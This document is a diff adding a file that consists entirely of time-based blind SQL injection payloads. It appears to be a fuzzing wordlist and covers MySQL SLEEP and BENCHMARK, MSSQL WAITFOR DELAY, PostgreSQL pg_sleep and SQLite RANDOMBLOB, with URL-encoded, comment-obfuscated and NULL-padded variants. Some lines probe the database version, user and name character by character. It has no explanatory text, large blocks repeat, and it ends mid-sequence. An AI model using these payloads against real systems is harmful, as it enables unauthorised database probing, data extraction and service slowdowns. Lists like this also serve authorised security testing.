@@ -1,0 +1,2936 @@
+1'; waitfor delay '0:0:5' - 
+' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'--
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR' 
+'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
+'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR' 
+'xor(if(now()=sysdate(),sleep(10),0))or'
++or+sleep(0.000000001)
+ AND SLEEP(15)
+%20AND%20SLEEP(15)
+%2c(select*from(select(sleep(30)))a)
+-sleep(5)
+-benchmark(1000000000,1-1) 
+'%2b(select*from(select(sleep(2)))a)%2b'
+'+(select*from(select(sleep(2)))a)+'
+'%2bIF(MID(@@version,1,1)=4,sleep(2),1)=2%2b'
+'+IF(MID(@@version,1,1)=4,sleep(2),1)=2+'
+(select(0)from(select(sleep(25)))v)
+-sleep/*f*/(10)
+-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0
+-if(mid(version/*f*/(),1,1)=4,sleep/*f*/(5),0)
+';SELECT 1;SELECT pg_sleep\(30\);--'
+%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
+AND SLEEP(7)# , %20AND%20SLEEP(7)%23
+ AND SLEEP(7)#
+%20SLEEP(7)%23
+SELECT * FROM (SELECT(SLEEP(5)))a)
+'=sleep(10)='1
+'=IF(MID(VERSION(),1,1)=1,SLEEP(10),0)='1
+'=IF(MID(VERSION(),1,1)=5,SLEEP(10),0)='1
+(select*from(select(sleep(5)))a)
+SLEEP(25)
++or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A))
++or+1=((SELECT+1+FROM+(SELECT+SLEEP(25))A))
+'%2b(select*from(select(sleep(3)))a)%2b'
+'%2b(select*from(select(sleep(0)))a)%2b
+' or sleep(5) # 
+/*'XOR(if(2=2,sleep(10),0))OR'
+%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))WUeh)
+if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"/
+AND (SELECT * FROM (SELECT(SLEEP(1)))WUeh)
+pg_sleep(30)--
+%2c(select*from(select(sleep(30)))a)  
+-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
+));waitfor delay '0:0:5'--
+";waitfor delay '0:0:__TIME_
+;waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:__TIME__'--
+'%20and%20(select%20*%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20;
+'%2bbenchmark(10000000%2csha1(1))%2b'
+'%2%20and%20 if(substring(user(),1,1)='c',SLEEP(3),1)%2b'
+")) or sleep(__TIME__)="
+") or pg_sleep(__TIME__)--
+1 or pg_sleep(__TIME__)--
+)) or pg_sleep(__TIME__)--
+1)) or sleep(__TIME__)#
+)) or sleep(__TIME__)='
+")) or pg_sleep(__TIME__)--
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+" or sleep(__TIME__)#
+pg_sleep(__TIME__)--
+1) or sleep(__TIME__)#
+1 waitfor delay '0:0:10'--
+));waitfor delay '0:0:__TIME__'--
+a' waitfor delay '0:0:10'--
+1 or sleep(__TIME__)#
+" or pg_sleep(__TIME__)--
+%20'sleep%2050'
+1)) or pg_sleep(__TIME__)--
+or sleep(__TIME__)='
+ or pg_sleep(__TIME__)--
+") or sleep(__TIME__)="
+) or pg_sleep(__TIME__)--
+or sleep(__TIME__)#
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR' 
+'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'
++or+sleep(0.000000001)
+%20AND%20SLEEP(5) 
+-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))
+%2c(select*from(select(sleep(30)))
+-sleep(5) 
+'%2bIF(MID(@@version,1,1)=4,sleep(2),1)=2%2b'
+'%2b(select*from(select(sleep(2)))a)%2b'
+pg_sleep(30)--
+(select(0)from(select(sleep(25)))v) 
+-sleep/*f*/(10)
+-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0) 
+';SELECT 1;SELECT pg_sleep\(30\);--'
+%20AND%20SLEEP(7)%23
+(SELECT * FROM (SELECT(SLEEP(5)))a)
+'xor(if(now()=sysdate(),sleep(10),0))or'
+'xor(if(mid(database(),1,1)=0x41,sleep(63),0))or' 
++or+sleep(0.000000001)
+%20AND%20SLEEP(15)
+-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))
+%2c(select*from(select(sleep(30)))a)
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+)%20waitfor%20delay%20'0:0:20'%20/*
+)%20waitfor%20delay%20'0:0:20'%20--
+')%20waitfor%20delay%20'0:0:20'%20/*
+')%20waitfor%20delay%20'0:0:20'%20--
+")%20waitfor%20delay%20'0:0:20'%20/*
+")%20waitfor%20delay%20'0:0:20'%20--
+))%20waitfor%20delay%20'0:0:20'%20/*
+))%20waitfor%20delay%20'0:0:20'%20--
+'))%20waitfor%20delay%20'0:0:20'%20/*
+'))%20waitfor%20delay%20'0:0:20'%20--
+"))%20waitfor%20delay%20'0:0:20'%20/*
+"))%20waitfor%20delay%20'0:0:20'%20--
+,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL)%20waifor%20delay%20'0:0:20'%20/*
+',NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL)%20waifor%20delay%20'0:0:20'%20/*
+'),NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+ waitfor delay '0:0:20' /* 
+ waitfor delay '0:0:20' --
+' waitfor delay '0:0:20' /* 
+' waitfor delay '0:0:20' --
+" waitfor delay '0:0:20' /* 
+" waitfor delay '0:0:20' --
+) waitfor delay '0:0:20' /* 
+) waitfor delay '0:0:20' --
+)) waitfor delay '0:0:20' /* 
+)) waitfor delay '0:0:20' --
+))) waitfor delay '0:0:20' /* 
+))) waitfor delay '0:0:20' --
+)))) waitfor delay '0:0:20' /* 
+)))) waitfor delay '0:0:20' --
+))))) waitfor delay '0:0:20' --
+)))))) waitfor delay '0:0:20' --
+') waitfor delay '0:0:20' /* 
+') waitfor delay '0:0:20' --
+") waitfor delay '0:0:20' /* 
+") waitfor delay '0:0:20' --
+')) waitfor delay '0:0:20' /* 
+')) waitfor delay '0:0:20' --
+")) waitfor delay '0:0:20' /* 
+")) waitfor delay '0:0:20' --
+'))) waitfor delay '0:0:20' /* 
+'))) waitfor delay '0:0:20' --
+"))) waitfor delay '0:0:20' /* 
+"))) waitfor delay '0:0:20' --
+')))) waitfor delay '0:0:20' /* 
+')))) waitfor delay '0:0:20' --
+")))) waitfor delay '0:0:20' /* 
+")))) waitfor delay '0:0:20' --
+'))))) waitfor delay '0:0:20' /* 
+'))))) waitfor delay '0:0:20' --
+"))))) waitfor delay '0:0:20' /* 
+"))))) waitfor delay '0:0:20' --
+')))))) waitfor delay '0:0:20' /* 
+')))))) waitfor delay '0:0:20' --
+")))))) waitfor delay '0:0:20' /* 
+")))))) waitfor delay '0:0:20' --
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
